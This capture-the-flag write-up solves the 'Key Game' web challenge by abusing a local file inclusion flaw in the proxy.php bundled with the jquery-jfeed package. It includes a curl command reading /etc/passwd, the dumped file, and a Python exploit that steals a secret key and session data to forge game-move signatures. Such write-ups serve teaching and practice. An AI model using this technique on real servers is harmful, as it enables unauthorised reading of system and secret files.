# Key Game — VSL CTF 2026

> **Room / Challenge:** Key Game (Web)

---

## Metadata

- **Author:** `jameskaois`
- **CTF:** VSL CTF 2026
- **Challenge:** Key Game (web)
- **Target / URL:** `https://vsl-ctf.com/challenges#Key%20Game-13`
- **Points:** `100`
- **Solved:** `43`
- **Date:** `27-01-2026`

---

## Goal

Leveraging vulnerability in libarary of the website and get the flag.

## My Solution

Doing some Reconnaissance we can find a library that is installed in `Dockerfile` but that never used by the website:

```
RUN apt update && apt install libjs-jquery-jfeed -y
```

This library is known for a vunerability, which includes an example proxy file `proxy.php` and this proxy is vulnerable to Local File Inclusion (LFI). Tried visiting `http://124.197.22.141:7878/javascript/jquery-jfeed/proxy.php?url=file:///etc/passwd`, got:

```
This page contains the following errors:
error on line 1 at column 1: Start tag expected, '<' not found
Below is a rendering of the page up to the first error.
```

Although this is an error, but it confirms we can read file, because it set `Content-Type: application/xml` so the format of `/etc/passwd` is not valid. Tried this to get the file:

```bash
curl "http://124.197.22.141:7878/javascript/jquery-jfeed/proxy.php?url=file:///etc/passwd"

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
```

From this we can get `/var/www/secret_key.txt` and `/tmp/sess_<MY_SESSION_ID>`, then we can loop through 40 steps of the game and get the flag. Expoit script:

```python
import requests
import hashlib
import re

HOST = "http://124.197.22.141:7878"
PROXY_PATH = "/javascript/jquery-jfeed/proxy.php"
SESSION_PATHS = [
    "/tmp/sess_{}",
    "/var/lib/php/sessions/sess_{}",
    "/tmp/php_sessions/sess_{}"
]

def get_file_content(session, file_path):
    try:
        url = f"{HOST}{PROXY_PATH}"
        res = session.get(url, params={'url': f'file://{file_path}'})
        return res.text
    except:
        return ""

def parse_path(session_data):
    try:
        matches = re.findall(r'i:(\d+);i:(\d+);', session_data)
        if not matches: return []
        path_map = {int(k): int(v) for k, v in matches}
        return [path_map[i] for i in range(len(path_map))]
    except:
        return []

def solve():
    s = requests.Session()
    s.get(f"{HOST}/index.php", params={'act': 'respawn'})
    sess_id = s.cookies.get('PHPSESSID')

    if not sess_id:
        print("[-] Error: No Session ID")
        return

    # 1. Steal Secret Key
    key_data = get_file_content(s, "/var/www/secret_key.txt")
    secret_key = key_data.strip().split('\n')[-1]

    if not secret_key:
        print("[-] Error: Could not read secret key")
        return

    # 2. Steal Random Path from Session File
    path_list = []
    for path_template in SESSION_PATHS:
        content = get_file_content(s, path_template.format(sess_id))
        if "path|a:40" in content:
            path_list = parse_path(content)
            break

    if len(path_list) != 40:
        print("[-] Error: Could not find session file or parse path")
        return

    # 3. Auto-play
    for step, side in enumerate(path_list):
        # Calculate Signature
        raw_sig = f"{secret_key}|{step}|{side}"
        signature = hashlib.md5(raw_sig.encode()).hexdigest()

        # Move
        params = {'act': 'move', 'step': step, 'side': side, 'h': signature}
        res = s.get(f"{HOST}/index.php", params=params)

        if "VSL{" in res.text:
            print(f"[SUCCESS] {res.text.split('|')[-1]}")
            return
        elif "You Died" in res.text:
            print("[-] Error: Died unexpectedly.")
            return

if __name__ == "__main__":
    solve()
```
